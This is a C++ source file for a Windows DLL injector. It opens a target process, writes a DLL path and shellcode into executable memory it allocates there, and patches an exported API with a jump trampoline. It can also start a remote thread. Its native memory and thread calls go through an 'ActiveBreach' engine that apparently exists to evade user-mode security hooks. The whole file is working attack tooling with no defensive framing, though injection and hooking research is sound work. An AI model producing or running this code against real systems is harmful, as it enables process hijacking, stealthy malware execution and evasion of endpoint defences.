#include "injector.h"
#include "shell.h"
#include "config.h"

#include "../extern/ActiveBreach-Engine/C++/Include/ActiveBreach.hpp"

#pragma comment(lib, "Shlwapi.lib")

using std::string;
using std::string_view;
using std::vector;
using std::array;
using std::optional;

using byte = unsigned char;

struct UniqueHandle {
    HANDLE h;
    UniqueHandle(HANDLE handle = nullptr) : h(handle) {}
    ~UniqueHandle() { if (h && h != INVALID_HANDLE_VALUE) CloseHandle(h); }
    HANDLE get() const { return h; }
    bool valid() const { return h && h != INVALID_HANDLE_VALUE; }
};

struct UniqueModule {
    HMODULE m;
    UniqueModule(HMODULE mod = nullptr) : m(mod) {}
    ~UniqueModule() { if (m) FreeLibrary(m); }
    HMODULE get() const { return m; }
    bool valid() const { return m != nullptr; }
};

constexpr size_t HOOK_SIZE = 12;
using NTSTATUS = LONG;
static auto NT_SUCCESS = [](NTSTATUS st) { return st >= 0; };

static string ResolveDllPath(string_view dllName);
static string FindSystemDllPath(string_view dllName);
static optional<uintptr_t> GetRemoteModuleBase(DWORD pid, string_view moduleName);
static optional<uintptr_t> FindExportRVA(string_view dllPath, string_view exportName);
static optional<PVOID> ResolveRemoteProc(DWORD pid, string_view dllName, string_view apiName);
static bool WriteTrampoline(HANDLE hProc, PVOID dest, PVOID src, size_t len, ULONG& oldProt);

bool N2Inject(
    DWORD pid,
    const char* targetDll,
    const char* targetApi,
    const char* dllPathInput)
{
    if (_AbViolationCount()) {
        printf("ActiveBreach violations detected: %u", _AbViolationCount());
        return false;
    }

    string dllPath = ResolveDllPath(dllPathInput);
    if (dllPath.empty()) {
        printf("Could not resolve DLL path for '%s'", dllPathInput);
        return false;
    }

    if (GetFileAttributesA(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        printf("DLL file not found: %s", dllPath.c_str());
        return false;
    }

    UniqueModule modTest(LoadLibraryExA(dllPath.c_str(), nullptr, LOAD_LIBRARY_AS_DATAFILE));
    if (!modTest.valid()) {
        printf("DLL failed to load or is corrupt: %s (err %lu)", dllPath.c_str(), GetLastError());
        return false;
    }

    UniqueHandle hProc(OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pid));
    if (!hProc.valid()) {
        printf("OpenProcess(%u) failed: %lu", pid, GetLastError());
        return false;
    }

    printf("Opened process %u", pid);

    auto hookAddrOpt = ResolveRemoteProc(pid, targetDll, targetApi);

    if (!hookAddrOpt) {
        printf("ResolveRemoteProc failed for %s!%s", targetDll, targetApi);
        return false;
    }

    PVOID hookAddr = reinterpret_cast<PVOID>(*hookAddrOpt);
    printf("Resolved %s!%s at %p", targetDll, targetApi, hookAddr);

    array<byte, HOOK_SIZE> orig{};
    ULONG bytesRead = 0;

    NTSTATUS st = ab_call_fn_cpp<NTSTATUS>("NtReadVirtualMemory", hProc.get(), hookAddr, orig.data(), static_cast<ULONG>(orig.size()), &bytesRead);

    if (!NT_SUCCESS(st) || bytesRead != HOOK_SIZE) {
        printf("NtReadVirtualMemory failed: 0x%X read %lu", st, bytesRead);
        return false;
    }

    printf("Read %lu bytes", bytesRead);

    PVOID remotePath = nullptr;
    SIZE_T pathLen = dllPath.size() + 1;

    st = ab_call_fn_cpp<NTSTATUS>("NtAllocateVirtualMemory", hProc.get(), &remotePath, 0, &pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st) || !remotePath) {
        printf("NtAllocateVirtualMemory(path) failed: 0x%X", st);
        return false;
    }

    st = ab_call_fn_cpp<NTSTATUS>("NtWriteVirtualMemory", hProc.get(), remotePath, const_cast<char*>(dllPath.c_str()), static_cast<ULONG>(pathLen), nullptr);
    if (!NT_SUCCESS(st)) {
        printf("NtWriteVirtualMemory(path) failed: 0x%X", st);
        return false;
    }

    printf("Wrote DLL path at %p", remotePath);

    PVOID remoteCode = nullptr;
    SIZE_T codeSize = 1024;

    st = ab_call_fn_cpp<NTSTATUS>("NtAllocateVirtualMemory", hProc.get(), &remoteCode, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(st) || !remoteCode) { printf("NtAllocateVirtualMemory(code) failed: 0x%X", st);
        return false;
    }

    vector<byte> shell = N2GenShell(hookAddr, remotePath, remoteCode, orig.data(), orig.size(), true);

    st = ab_call_fn_cpp<NTSTATUS>("NtWriteVirtualMemory", hProc.get(), remoteCode, shell.data(), static_cast<ULONG>(shell.size()), nullptr);
    if (!NT_SUCCESS(st)) {
        printf("NtWriteVirtualMemory(code) failed: 0x%X", st);
        return false;
    }

    printf("Shellcode written (%zu bytes)", shell.size());

    ULONG oldProt = 0;
    if (!WriteTrampoline(hProc.get(), hookAddr, remoteCode, HOOK_SIZE, oldProt)) {
        printf("WriteTrampoline failed");
        return false;
    }

    printf("Trampoline installed");

#if N2_RTE
    HANDLE hThread = nullptr;

    st = ab_call_fn_cpp<NTSTATUS>("NtCreateThreadEx", &hThread, THREAD_ALL_ACCESS, nullptr, hProc.get(), hookAddr, nullptr, 0, 0, 0, 0, nullptr);
    if (NT_SUCCESS(st) && hThread) {
        printf("Remote thread %p", hThread);

        WaitForSingleObject(hThread, 10000);

        CloseHandle(hThread);
    }

    else {
        printf("NtCreateThreadEx failed: 0x%X", st);
    }
#else
    printf("Remote thread execution disabled");
#endif

    printf("Injection complete");

    return true;
}

// Helpers

static string ResolveDllPath(string_view dllName) {
    char buf[MAX_PATH]{};
    if (!GetModuleFileNameA(nullptr, buf, MAX_PATH)) return {};
    PathRemoveFileSpecA(buf);
    return std::string(buf) + "\\" + std::string(dllName);
}

static string FindSystemDllPath(string_view dllName) {
    char sysdir[MAX_PATH]{};
    GetSystemDirectoryA(sysdir, MAX_PATH);
    return std::string(sysdir) + "\\" + std::string(dllName);
}

static optional<uintptr_t> GetRemoteModuleBase(DWORD pid, string_view moduleName) {
    std::wstring wmod(moduleName.begin(), moduleName.end());
    UniqueHandle hs(CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid));

    if (!hs.valid()) return {};

    MODULEENTRY32W me{ sizeof(me) };

    if (Module32FirstW(hs.get(), &me)) {
        do {
            if (_wcsicmp(me.szModule, wmod.c_str()) == 0)
                return reinterpret_cast<uintptr_t>(me.modBaseAddr);
        } while (Module32NextW(hs.get(), &me));
    }

    return {};
}

static optional<uintptr_t> FindExportRVA(string_view dllPath, string_view exportName) {
    UniqueModule mod(LoadLibraryExA(dllPath.data(), nullptr, DONT_RESOLVE_DLL_REFERENCES));
    if (!mod.valid()) return {};

    byte* base = reinterpret_cast<byte*>(mod.get());
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    auto& d = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (!d.VirtualAddress) return {};

    auto ed = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(base + d.VirtualAddress);
    auto names = reinterpret_cast<DWORD*>(base + ed->AddressOfNames);
    auto ords = reinterpret_cast<WORD*>(base + ed->AddressOfNameOrdinals);
    auto addrs = reinterpret_cast<DWORD*>(base + ed->AddressOfFunctions);

    for (DWORD i = 0; i < ed->NumberOfNames; ++i) {
        const char* n = reinterpret_cast<const char*>(base + names[i]);
        if (_stricmp(n, exportName.data()) == 0)
            return static_cast<uintptr_t>(addrs[ords[i]]);
    }

    return {};
}

static optional<PVOID> ResolveRemoteProc(
    DWORD pid, string_view dllName, string_view apiName)
{
    auto baseOpt = GetRemoteModuleBase(pid, dllName);
    if (!baseOpt) return {};

    static constexpr auto sysdlls = std::array<const char*, 5>{ "kernel32.dll","user32.dll","ntdll.dll","advapi32.dll","gdi32.dll" };

    string local = [&] {
        auto it = std::find_if(sysdlls.begin(), sysdlls.end(),
            [&](auto& s) {return _stricmp(dllName.data(), s) == 0; });
        return it != sysdlls.end()
            ? FindSystemDllPath(dllName)
            : ResolveDllPath(dllName);
        }();

    auto rvaOpt = FindExportRVA(local, apiName);
    if (!rvaOpt) return {};

    return reinterpret_cast<PVOID>(*baseOpt + *rvaOpt);
}

static bool WriteTrampoline(
    HANDLE hProc, PVOID dest, PVOID src, size_t len, ULONG& oldProt)
{
    SIZE_T sz = len; PVOID addr = dest;
    NTSTATUS st = ab_call_fn_cpp<NTSTATUS>("NtProtectVirtualMemory", hProc, &addr, &sz, PAGE_EXECUTE_READWRITE, &oldProt);
    if (!NT_SUCCESS(st)) return false;

    array<byte, HOOK_SIZE> hook;

    hook = { 0x48,0xB8 };
    std::memcpy(hook.data() + 2, &src, sizeof(src));
    hook[10] = 0xFF; hook[11] = 0xE0;

    st = ab_call_fn_cpp<NTSTATUS>("NtWriteVirtualMemory", hProc, dest, hook.data(), static_cast<ULONG>(len), nullptr);
    if (!NT_SUCCESS(st)) return false;

    st = ab_call_fn_cpp<NTSTATUS>("NtProtectVirtualMemory", hProc, &addr, &sz, oldProt, &oldProt);
    return NT_SUCCESS(st);
}